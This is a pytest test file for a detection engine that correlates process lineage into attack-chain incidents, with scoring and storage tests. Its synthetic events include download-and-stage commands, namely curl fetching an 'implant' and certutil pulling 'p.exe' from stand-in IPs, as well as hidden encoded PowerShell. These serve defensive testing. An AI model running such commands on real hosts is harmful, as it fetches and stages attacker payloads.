"""
Tests for process tree construction and chain correlation.

Covers lineage linking, phantom parents, pid reuse guards, host isolation,
chain rule loading and validation, window and ordering constraints,
incident scoring, deterministic replay, and incident persistence.
"""
import os
import tempfile
from datetime import datetime, timedelta

import pytest

from collectors.base import Event
from core.correlator import (
    ChainRule,
    ChainRuleLoader,
    Correlator,
    load_chain_rules,
)
from core.database import AlertDatabase
from core.fingerprint import compute_incident_fingerprint
from core.process_tree import build_forest

T0 = datetime(2026, 7, 11, 10, 0, 0)


def make_event(
    process_name,
    command_line="",
    pid=100,
    ppid=None,
    parent_name=None,
    platform="windows",
    user="alice",
    offset_seconds=0,
    host="ws01",
):
    """Create a synthetic event with a host identity."""
    return Event(
        timestamp=T0 + timedelta(seconds=offset_seconds),
        platform=platform,
        process_name=process_name,
        command_line=command_line,
        user=user,
        process_id=pid,
        parent_process_name=parent_name,
        parent_process_id=ppid,
        raw_data={"hostname": host} if host else {},
    )


def office_chain_events(host="ws01"):
    """Word document spawning encoded PowerShell, both events observed."""
    return [
        make_event(
            "WINWORD.EXE",
            command_line='"C:\\Program Files\\Office\\WINWORD.EXE" invoice.docx',
            pid=100, ppid=1, parent_name="explorer.exe",
            offset_seconds=0, host=host,
        ),
        make_event(
            "powershell.exe",
            command_line="powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA",
            pid=200, ppid=100, parent_name="WINWORD.EXE",
            offset_seconds=90, host=host,
        ),
    ]


def webserver_chain_events(host="srv01"):
    """nginx spawning a shell which fetches a payload over HTTP."""
    return [
        make_event(
            "nginx", command_line="nginx: worker process",
            pid=500, ppid=1, parent_name="systemd",
            platform="linux", user="www-data", offset_seconds=0, host=host,
        ),
        make_event(
            "sh", command_line="sh -c 'id; uname -a'",
            pid=600, ppid=500, parent_name="nginx",
            platform="linux", user="www-data", offset_seconds=30, host=host,
        ),
        make_event(
            "curl", command_line="curl -s http://198.51.100.7/implant -o /tmp/x",
            pid=700, ppid=600, parent_name="sh",
            platform="linux", user="www-data", offset_seconds=60, host=host,
        ),
    ]


class TestProcessTree:
    """Process tree construction and lineage linking."""

    def test_parent_child_link_by_ppid(self):
        forest = build_forest(office_chain_events())
        nodes = forest["ws01"]
        word = next(n for n in nodes if n.process_name == "WINWORD.EXE" and not n.is_phantom)
        ps = next(n for n in nodes if n.process_name == "powershell.exe")
        assert ps.parent is word
        assert ps in word.children

    def test_phantom_parent_synthesized_when_unobserved(self):
        events = office_chain_events()[1:]  # only the powershell event
        forest = build_forest(events)
        nodes = forest["ws01"]
        ps = next(n for n in nodes if n.process_name == "powershell.exe")
        assert ps.parent is not None
        assert ps.parent.is_phantom
        assert ps.parent.process_name == "WINWORD.EXE"
        assert ps.parent.pid == 100
        assert ps.parent.timestamp is None

    def test_phantoms_merge_by_ppid_and_name(self):
        events = [
            make_event("powershell.exe", pid=200, ppid=100, parent_name="WINWORD.EXE"),
            make_event("cmd.exe", pid=300, ppid=100, parent_name="WINWORD.EXE",
                       offset_seconds=5),
        ]
        nodes = build_forest(events)["ws01"]
        phantoms = [n for n in nodes if n.is_phantom]
        assert len(phantoms) == 1
        assert len(phantoms[0].children) == 2

    def test_phantoms_without_ppid_stay_separate(self):
        events = [
            make_event("curl", pid=200, ppid=None, parent_name="bash",
                       platform="linux"),
            make_event("wget", pid=300, ppid=None, parent_name="bash",
                       platform="linux", offset_seconds=5),
        ]
        nodes = build_forest(events)["ws01"]
        phantoms = [n for n in nodes if n.is_phantom]
        assert len(phantoms) == 2

    def test_pid_reuse_name_guard_refuses_wrong_parent(self):
        events = [
            make_event("notepad.exe", pid=100, offset_seconds=0),
            make_event("powershell.exe", pid=200, ppid=100,
                       parent_name="WINWORD.EXE", offset_seconds=10),
        ]
        nodes = build_forest(events)["ws01"]
        ps = next(n for n in nodes if n.process_name == "powershell.exe")
        # Declared parent name disagrees with the pid 100 event, so the
        # link must go to a phantom, not to notepad.
        assert ps.parent.is_phantom
        assert ps.parent.process_name == "WINWORD.EXE"

    def test_pid_reuse_latest_matching_instance_wins(self):
        events = [
            make_event("WINWORD.EXE", pid=100, offset_seconds=0),
            make_event("WINWORD.EXE", pid=100, offset_seconds=50),
            make_event("powershell.exe", pid=200, ppid=100,
                       parent_name="WINWORD.EXE", offset_seconds=60),
        ]
        nodes = build_forest(events)["ws01"]
        ps = next(n for n in nodes if n.process_name == "powershell.exe")
        assert not ps.parent.is_phantom
        assert ps.parent.timestamp == T0 + timedelta(seconds=50)

    def test_hosts_are_isolated(self):
        events = [
            make_event("WINWORD.EXE", pid=100, host="ws01"),
            make_event("powershell.exe", pid=200, ppid=100,
                       parent_name="WINWORD.EXE", offset_seconds=10, host="ws02"),
        ]
        forest = build_forest(events)
        ws02_ps = next(
            n for n in forest["ws02"] if n.process_name == "powershell.exe"
        )
        # The ws01 WINWORD event must not become the ws02 parent.
        assert ws02_ps.parent.is_phantom

    def test_descendants_iteration_survives_cycles(self):
        nodes = build_forest(office_chain_events())["ws01"]
        word = next(n for n in nodes if n.process_name == "WINWORD.EXE" and not n.is_phantom)
        ps = next(n for n in nodes if n.process_name == "powershell.exe")
        # Corrupt the tree with a cycle; iteration must still terminate.
        ps.children.append(word)
        descendants = list(word.iter_descendants())
        assert ps in descendants


class TestChainRuleLoading:
    """Chain rule schema validation and loading."""

    def test_bundled_chains_load(self):
        chains = load_chain_rules()
        ids = {c.id for c in chains}
        assert {"CHAIN-WIN-001", "CHAIN-WIN-002",
                "CHAIN-LNX-001", "CHAIN-LNX-002"} <= ids
        for chain in chains:
            assert len(chain.stages) >= 2
            assert chain.window_seconds > 0

    def test_invalid_regex_raises(self):
        with pytest.raises(ValueError, match="invalid"):
            ChainRule({
                "name": "Bad", "id": "CHAIN-WIN-099", "platform": "windows",
                "severity": "high", "window_seconds": 60,
                "stages": [
                    {"name": "a", "match": {"process_name": "x.exe"}},
                    {"name": "b", "match": {"command_regex": "([unclosed"}},
                ],
            })

    def test_schema_rejects_unknown_match_keys(self, tmp_path):
        bad = tmp_path / "bad.yml"
        bad.write_text(
            "name: Bad\n"
            "id: CHAIN-WIN-098\n"
            "platform: windows\n"
            "severity: high\n"
            "window_seconds: 60\n"
            "stages:\n"
            "  - name: a\n"
            "    match:\n"
            "      command_contains_all:\n"
            "        - x\n"
            "  - name: b\n"
            "    match:\n"
            "      process_name: y.exe\n"
        )
        loader = ChainRuleLoader()
        with pytest.raises(Exception):
            loader.load_chain_file(str(bad))

    def test_duplicate_ids_skip_second_file(self, tmp_path, caplog):
        original = open(
            "rules/correlation/chain-win-001_office_spawns_encoded_powershell.yml"
        ).read()
        (tmp_path / "a.yml").write_text(original)
        (tmp_path / "b.yml").write_text(original)
        loader = ChainRuleLoader()
        chains = loader.load_chains_directory(str(tmp_path))
        assert len(chains) == 1

    def test_missing_directory_returns_empty(self):
        loader = ChainRuleLoader()
        assert loader.load_chains_directory("rules/no-such-dir") == []


class TestCorrelation:
    """Chain matching across process lineage."""

    @pytest.fixture
    def correlator(self):
        return Correlator(load_chain_rules())

    def test_office_chain_full_telemetry(self, correlator):
        incidents = correlator.correlate(office_chain_events())
        assert len(incidents) == 1
        incident = incidents[0]
        assert incident.chain_id == "CHAIN-WIN-001"
        assert incident.host == "ws01"
        assert incident.confidence == 80
        assert incident.score == 128
        assert incident.risk_band == "critical"
        assert [s["stage"] for s in incident.stages] == [
            "office_parent", "obfuscated_shell_child",
        ]
        # Supporting events are preserved verbatim
        assert incident.stages[1]["event"]["process_name"] == "powershell.exe"
        assert not incident.stages[0]["phantom"]

    def test_office_chain_phantom_parent_lower_confidence(self, correlator):
        incidents = correlator.correlate(office_chain_events()[1:])
        assert len(incidents) == 1
        incident = incidents[0]
        assert incident.stages[0]["phantom"]
        assert incident.confidence == 70
        assert incident.score == 116
        assert incident.risk_band == "high"

    def test_benign_parent_does_not_match(self, correlator):
        events = [
            make_event("explorer.exe", pid=100),
            make_event(
                "powershell.exe",
                command_line="powershell.exe -EncodedCommand SQBFAFgA",
                pid=200, ppid=100, parent_name="explorer.exe", offset_seconds=10,
            ),
        ]
        incidents = correlator.correlate(events)
        assert incidents == []

    def test_plain_powershell_from_office_does_not_match(self, correlator):
        events = office_chain_events()
        events[1].command_line = "powershell.exe -File signed_addin.ps1"
        assert correlator.correlate(events) == []

    def test_window_enforced(self, correlator):
        events = office_chain_events()
        events[1].timestamp = T0 + timedelta(seconds=301)
        assert correlator.correlate(events) == []
        events[1].timestamp = T0 + timedelta(seconds=300)
        assert len(correlator.correlate(events)) == 1

    def test_three_stage_linux_chain(self, correlator):
        incidents = correlator.correlate(webserver_chain_events())
        assert len(incidents) == 1
        incident = incidents[0]
        assert incident.chain_id == "CHAIN-LNX-001"
        assert incident.confidence == 85
        assert incident.score == 133
        assert incident.risk_band == "critical"
        assert len(incident.stages) == 3

    def test_three_stage_chain_requires_middle_stage(self, correlator):
        events = webserver_chain_events()
        # curl directly under nginx, no shell in between
        events[2].parent_process_id = 500
        events[2].parent_process_name = "nginx"
        incidents = [
            i for i in correlator.correlate(events[:1] + events[2:])
            if i.chain_id == "CHAIN-LNX-001"
        ]
        assert incidents == []

    def test_stage_with_command_criteria_rejects_phantom(self, correlator):
        # Only the shell event: nginx parent is phantom (allowed for stage 1,
        # name-only matcher) but the curl stage is missing entirely.
        events = webserver_chain_events()[1:2]
        assert correlator.correlate(events) == []

    def test_deterministic_replay(self, correlator):
        events = office_chain_events() + webserver_chain_events()
        first = [i.to_dict() for i in correlator.correlate(events)]
        second = [i.to_dict() for i in correlator.correlate(list(reversed(events)))]
        assert first == second
        assert len(first) == 2

    def test_no_chains_or_no_events(self):
        assert Correlator([]).correlate(office_chain_events()) == []
        assert Correlator(load_chain_rules()).correlate([]) == []

    def test_script_host_lolbin_chain(self, correlator):
        events = [
            make_event("cscript.exe", command_line="cscript.exe update.vbs",
                       pid=100, ppid=1, parent_name="explorer.exe"),
            make_event(
                "certutil.exe",
                command_line="certutil.exe -urlcache -split -f http://203.0.113.9/p.exe",
                pid=200, ppid=100, parent_name="cscript.exe", offset_seconds=20,
            ),
        ]
        incidents = correlator.correlate(events)
        assert [i.chain_id for i in incidents] == ["CHAIN-WIN-002"]


class TestIncidentPersistence:
    """Incident fingerprinting and database storage."""

    @pytest.fixture
    def temp_db(self):
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
        try:
            yield AlertDatabase(db_path)
        finally:
            os.unlink(db_path)

    @pytest.fixture
    def incident(self):
        correlator = Correlator(load_chain_rules())
        return correlator.correlate(office_chain_events())[0]

    def test_fingerprint_stable_across_rescans(self, incident):
        correlator = Correlator(load_chain_rules())
        rescan = correlator.correlate(office_chain_events())[0]
        assert compute_incident_fingerprint(incident) == \
            compute_incident_fingerprint(rescan)

    def test_fingerprint_differs_per_host(self):
        correlator = Correlator(load_chain_rules())
        a = correlator.correlate(office_chain_events(host="ws01"))[0]
        b = correlator.correlate(office_chain_events(host="ws02"))[0]
        assert compute_incident_fingerprint(a) != compute_incident_fingerprint(b)

    def test_save_and_dedup(self, temp_db, incident):
        first = temp_db.save_incident(incident)
        assert first["is_duplicate"] is False
        second = temp_db.save_incident(incident)
        assert second["is_duplicate"] is True
        assert second["incident_id"] == first["incident_id"]

    def test_get_incidents_filters(self, temp_db, incident):
        temp_db.save_incident(incident)
        rows = temp_db.get_incidents(chain_id="CHAIN-WIN-001")
        assert len(rows) == 1
        record = rows[0]
        assert record["risk_band"] == "critical"
        assert record["stages"][0]["stage"] == "office_parent"
        assert record["mitre_attack"] == ["T1566.001", "T1059.001", "T1027"]
        assert temp_db.get_incidents(chain_id="CHAIN-LNX-001") == []
        assert temp_db.get_incidents(min_score=140) == []
        assert len(temp_db.get_incidents(severity="critical")) == 1
